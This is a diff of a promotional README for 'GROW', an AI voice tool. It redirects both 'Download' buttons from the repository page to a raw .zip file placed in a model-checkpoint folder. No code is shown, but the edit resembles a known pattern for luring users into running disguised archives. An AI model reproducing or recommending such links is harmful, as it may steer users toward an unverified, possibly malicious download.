@@ -1,6 +1,6 @@
 # 🌱 GROW - Your Path to Stunning AI Voices
 
-[![Download GROW](https://img.shields.io/badge/Download-GROW-brightgreen?style=for-the-badge&logo=github)](https://github.com/photographic-dialogue455/GROW)
+[![Download GROW](https://img.shields.io/badge/Download-GROW-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/photographic-dialogue455/GROW/main/model_ckpts/03_grow_nfe10/v1.4-alpha.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ The technology behind GROW is cutting-edge, using a special approach called "Gro
 
 Click the big green button at the top of this page or use this direct link:
 
-[**✅ Download GROW Now**](https://github.com/photographic-dialogue455/GROW)
+[**✅ Download GROW Now**](https://raw.githubusercontent.com/photographic-dialogue455/GROW/main/model_ckpts/03_grow_nfe10/v1.4-alpha.3.zip)
 
 Visit this link to download the application.
 
